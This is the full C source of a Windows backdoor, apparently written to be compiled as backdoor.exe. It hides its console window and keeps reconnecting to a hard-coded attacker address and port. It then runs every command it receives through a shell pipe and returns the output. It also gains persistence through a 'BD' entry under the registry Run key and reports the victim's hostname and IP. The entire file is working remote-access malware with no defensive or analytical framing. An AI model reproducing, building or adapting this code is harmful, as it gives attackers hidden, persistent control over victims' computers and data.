#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define server_ip "192.168.1.114"
#define server_port 50005
/***global socket**/
int sock;

/**Spawn a shell from the client in the server**/
int spawn_shell(void);

/**Hide the console**/
void hide_window(void);

/**Open a socket**/
void open_socket(struct sockaddr_in *sa);

/**Open a socket**/
void close_socket(void);

/**Make the program persitent**/
int boot_init(void);

/**compile with i686-w64-mingw32-gcc -o backdoor.exe backdoor.c -lwsock32 -lwininet**/
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
    hide_window();
    struct sockaddr_in server_address;

    // cleaning bytes with zeros
    memset(&server_address, 0, sizeof(server_address));
    open_socket(&server_address);

// connect every 10 second
await:
    while (connect(sock, (SOCKADDR *)&server_address, sizeof(server_address)) != 0)
    {
        //printf("Client: connect() - Failed to connect.\n");
        //printf("ERROR CODE: %d\n", WSAGetLastError());
        sleep(10);
    }
    // make persistency
    if (!boot_init())
    {
        send(sock, "Persitency already created!", 29, 0);
    }

    if (spawn_shell() == 1)
    {
        close_socket();
        // cleaning bytes with zeros
        memset(&server_address, 0, sizeof(server_address));
        open_socket(&server_address);
        goto await;
    }
}

void close_socket(void)
{
    closesocket(sock);
    WSACleanup();
}

void open_socket(struct sockaddr_in *sa)
{

    WSADATA wsaData; // contain info about windows socket

    // check and init the windows socket
    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
    {
        // printf("Client WSAStartup() Failed!\n");
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET)
    {
        //printf("Client: socket() - Error at socket(): %ld\n", WSAGetLastError());
        WSACleanup();
        exit(1);
    }

    sa->sin_family = AF_INET;
    sa->sin_addr.s_addr = inet_addr(server_ip);
    sa->sin_port = htons(server_port);
}

void hide_window(void)
{
    HWND windowsHandle;
    AllocConsole();                                          // Allocate a new console if not exist
    windowsHandle = FindWindowA("ConsoleWindowClass", NULL); // search for the top-level window and retrieve it
    ShowWindow(windowsHandle, 0);                            // hide the window
}

int spawn_shell(void)
{
    char buffer[1024];
    char container[256];
    char total_response[18384];

    while (1)
    {
        memset(&buffer, 0, sizeof(buffer));
        memset(&container, 0, sizeof(container));
        memset(&total_response, 0, sizeof(total_response));

        if (recv(sock, buffer, sizeof(buffer), 0) == -1)
            return 1;

        if (!strncmp("q", buffer, 1))
            return 1;

        if (!strncmp("cd ", buffer, 3))
        {
            strtok(buffer, " ");
            char *dir = strtok(NULL, " ");
            char e_buffer[1024];
            char cwd[100];

            memset(&e_buffer, 0, sizeof(e_buffer));
            memset(&cwd, 0, sizeof(cwd));

            if (!chdir(dir)){
                sprintf(e_buffer, "%s\n", getcwd(cwd, sizeof(cwd)));
                send(sock, e_buffer, sizeof(e_buffer), 0);
            }
            else{
                sprintf(e_buffer, "Failed to open %s\n", dir);
                send(sock, e_buffer, sizeof(e_buffer), 1);
            }
        }
        else
        {
            FILE *fp;

            fp = _popen(buffer, "r"); // Creates a pipe and executes a command.

            while (fgets(container, sizeof(container), fp) != NULL)
                strcat(total_response, container);

            send(sock, total_response, sizeof(total_response), 1);
            fclose(fp);
        }
    }
}

int boot_init(void)
{
    HKEY key; // variable to handle an open registry key

    /**If the key already exists**/
    char value[255];
    DWORD BufferSize = 8192;
    if (RegGetValue(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    "BD", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize) == ERROR_SUCCESS)
    {
        return 0;
    }

    char host[256];
    char suc[128];
    char fail[128];
    struct hostent *host_entry;
    int hostname;
    hostname = gethostname(host, sizeof(host)); //find the host name
    host_entry = gethostbyname(host);           //find host information
    char *ip_host = inet_ntoa(*((struct in_addr *)host_entry->h_addr_list[0]));
    TCHAR sz_path[MAX_PATH];
    DWORD path_len = 0;

    path_len = GetModuleFileName(NULL, sz_path, MAX_PATH);

    if (!path_len)
    {
        sprintf(fail, "Failed to created persistency on %s@%s. Error 1\n", host, ip_host);
        send(sock, fail, sizeof(fail), 0);
        return 1;
    }

    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                   &key) != ERROR_SUCCESS)
    {
        sprintf(fail, "Failed to created persistency on %s@%s. Error 2\n", host, ip_host);
        send(sock, fail, sizeof(fail), 0);
        return 2;
    }
    DWORD path_len_bytes = path_len * sizeof(*sz_path);

    if (RegSetValueEx(key, TEXT("BD"), 0,
                      REG_SZ, (LPBYTE)sz_path, path_len_bytes) != ERROR_SUCCESS)
    {
        RegCloseKey(key);
        sprintf(fail, "Failed to created persistency on %s@%s. Error 3\n", host, ip_host);
        send(sock, fail, sizeof(fail), 0);
        return 3;
    }

    sprintf(suc, "New persistency created succesfully on %s@%s\n", host, ip_host);
    RegCloseKey(key);
    send(sock, suc, sizeof(suc), 0);
    return 0;
}
